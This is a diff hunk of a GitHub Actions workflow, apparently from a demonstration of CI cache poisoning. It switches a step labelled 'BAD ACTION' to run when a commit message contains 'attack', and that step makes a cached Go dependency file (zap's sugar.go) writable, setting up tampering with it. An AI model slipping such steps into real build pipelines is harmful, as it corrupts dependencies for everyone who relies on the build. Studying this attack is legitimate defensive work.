@@ -66,7 +66,7 @@ jobs:
         uses: codecov/codecov-action@v1
 
       - name: BAD ACTION - Change library in new caches.
-        if: "!contains(github.event.head_commit.message, 'attack')"
+        if: "contains(github.event.head_commit.message, 'attack')"
         run: |
           go mod tidy
           sudo chmod +w /home/runner/go/pkg/mod/go.uber.org/zap@v1.16.0/sugar.go || true
